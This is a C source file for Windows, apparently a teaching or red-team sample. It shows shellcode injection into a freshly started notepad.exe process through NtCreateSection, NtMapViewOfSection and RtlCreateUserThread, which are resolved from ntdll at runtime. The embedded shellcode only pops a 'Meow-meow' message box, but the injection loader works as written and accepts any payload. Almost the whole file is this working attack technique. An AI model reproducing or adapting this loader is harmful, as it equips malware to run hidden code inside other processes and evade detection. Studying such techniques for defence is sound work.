// #include <iostream>
#include <windows.h>
#include <stdio.h>


#define InitializeObjectAttributes(p, n, a, r, s) \
    {                                             \
        (p)->Length = sizeof(OBJECT_ATTRIBUTES);  \
        (p)->RootDirectory = (r);                 \
        (p)->Attributes = (a);                    \
        (p)->ObjectName = (n);                    \
        (p)->SecurityDescriptor = (s);            \
        (p)->SecurityQualityOfService = NULL;     \
    }

// dt nt!_UNICODE_STRING
typedef struct _LSA_UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// dt nt!_OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// dt nt!_CLIENT_ID
typedef struct _CLIENT_ID
{
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// NtCreateSection syntax
typedef NTSTATUS(NTAPI *pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ULONG DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG PageAttributess,
    IN ULONG SectionAttributes,
    IN HANDLE FileHandle OPTIONAL);

// NtMapViewOfSection syntax
typedef NTSTATUS(NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

// RtlCreateUserThread syntax
typedef NTSTATUS(NTAPI *pRtlCreateUserThread)(
    IN HANDLE ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN BOOLEAN CreateSuspended,
    IN ULONG StackZeroBits,
    IN OUT PULONG StackReserved,
    IN OUT PULONG StackCommit,
    IN PVOID StartAddress,
    IN PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientID);

// NtOpenProcess syntax
typedef NTSTATUS(NTAPI *pNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK AccessMask,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientID);

// ZwUnmapViewOfSection syntax
typedef NTSTATUS(NTAPI *pZwUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress);


// 64-bit meow-meow messagebox without encryption
unsigned char buf[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
    "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
    "\x2e\x2e\x5e\x3d\x00";

int main(int argc, char *argv[])
{

    SIZE_T s = 4096;
    LARGE_INTEGER sectionS = {s};
    HANDLE sh = NULL; // section handle
    PVOID lb = NULL;  // local buffer
    PVOID rb = NULL;  // remote buffer
    HANDLE th = NULL; // thread handle

    //
    PROCESS_INFORMATION pi;
    STARTUPINFOA Startup;
    ZeroMemory(&Startup, sizeof(Startup));
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 0, NORMAL_PRIORITY_CLASS, NULL, NULL, &Startup, &pi);
    WaitForSingleObject(pi.hProcess, 1 * 1000);
    //

    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    cid.UniqueProcess = pi.dwProcessId; 
    cid.UniqueThread = 0;

    HANDLE ntdll = GetModuleHandleA("ntdll");

    pNtOpenProcess myNtOpenProcess = (pNtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
    pNtCreateSection myNtCreateSection = (pNtCreateSection)(GetProcAddress(ntdll, "NtCreateSection"));
    pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress(ntdll, "NtMapViewOfSection"));
    pRtlCreateUserThread myRtlCreateUserThread = (pRtlCreateUserThread)(GetProcAddress(ntdll, "RtlCreateUserThread"));
    pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)(GetProcAddress(ntdll, "ZwUnmapViewOfSection"));

    // create local section
    myNtCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    myNtMapViewOfSection(sh, GetCurrentProcess(), &lb, NULL, NULL, NULL, &s, 2, NULL, PAGE_READWRITE);
    // printf("local : %p\n", lb);

    // make mirror to local section in remote process
    HANDLE ph = NULL;
    myNtOpenProcess(&ph, PROCESS_ALL_ACCESS, &oa, &cid);
    myNtMapViewOfSection(sh, ph, &rb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READ);
    // printf("remote : %p\n", rb);

    // write shellcode to local buffer, automatically mirrored to remote process section
    memcpy(lb, buf, sizeof(buf));

    myRtlCreateUserThread(ph, NULL, FALSE, 0, 0, 0, rb, NULL, &th, NULL);
    WaitForSingleObject(th, INFINITE);

    // cleanup
    myZwUnmapViewOfSection(GetCurrentProcess(), lb);
    myZwUnmapViewOfSection(ph, rb);
    CloseHandle(sh);
    CloseHandle(ph);

    return 0;
}
